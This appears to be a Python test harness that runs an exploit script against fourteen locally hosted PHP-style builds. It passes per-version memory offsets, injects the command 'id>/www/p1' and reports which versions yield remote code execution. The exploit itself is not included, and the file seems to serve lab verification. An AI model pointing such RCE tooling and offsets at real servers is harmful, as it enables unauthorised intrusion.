import subprocess, sys
BASE = r"C:\Users\likat\p2s52704"
VERS = [
    ("p2s5445", "18101", "0x2f2e20", "0x3cd750"),
    ("p2s5538", "18102", "0x357e70", "0x438b80"),
    ("p2s5640", "18103", "0x378e80", "0x466920"),
    ("p2s7033", "18104", "0x3948d0", "0x47b7b0"),
    ("p2s7133", "18105", "0x300420", "0x3e6f60"),
    ("p2s7234", "18106", "0x3624e0", "0x451010"),
    ("p2s7333", "18107", "0x35f640", "0x440dc0"),
    ("p2s7433", "18108", "0x335850", "0x417d60"),
    ("p2s8030", "18109", "0x3495d0", "0x4319a0"),
    ("p2s8132", "18110", "0x36b080", "0x450690"),
    ("p2s8234", "18111", "0x39b8a0", "0x487650"),
    ("p2s8335", "18112", "0x3ac080", "0x49ec50"),
    ("p2s8426", "18113", "0x465370", "0x65eb60"),
    ("p2s8511", "18114", "0x5996e0", "0x7b47a0"),
]

def one(c, port, zif, dtor):
    cmd = ["python", BASE + r"\exploit.py",
           "-u", f"http://127.0.0.1:{port}/index.php",
           "--profile", "bookworm",
           "--zif-offset", zif, "--dtor-offset", dtor,
           "-c", "id>/www/p1",
           "--fetch", "/p1"]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
        out = (r.stdout or "") + (r.stderr or "")
    except subprocess.TimeoutExpired:
        out = "TIMEOUT"
    rce = "uid=33" in out
    return c, port, rce, out

def main():
    only = sys.argv[1:] if len(sys.argv) > 1 else None
    procs = []
    for c, port, zif, dtor in VERS:
        if only and c not in only:
            continue
        import threading
        p = threading.Thread(target=lambda c=c, port=port, zif=zif, dtor=dtor: procs.append(one(c, port, zif, dtor)))
        p.start()
    for p in [t for t in threading.enumerate() if t is not threading.current_thread()]:
        p.join()
    procs.sort(key=lambda x: x[0])
    print("="*60)
    ok, no = [], []
    for c, port, rce, out in procs:
        (ok if rce else no).append(c)
        print(f"{c:10s} port={port}  {'*** RCE PROVEN ***' if rce else 'no RCE'}")
        if not rce:
            key = [l for l in out.splitlines() if any(k in l for k in ("stage","HEAP","libphp","FAIL","proof","uid="))]
            for l in key[-4:]:
                print("      " + l.strip()[:120])
    print(f"\nRCE proven ({len(ok)}/{len(procs)}): {', '.join(ok)}")
    print(f"No RCE ({len(no)}): {', '.join(no)}")

if __name__ == "__main__":
    main()
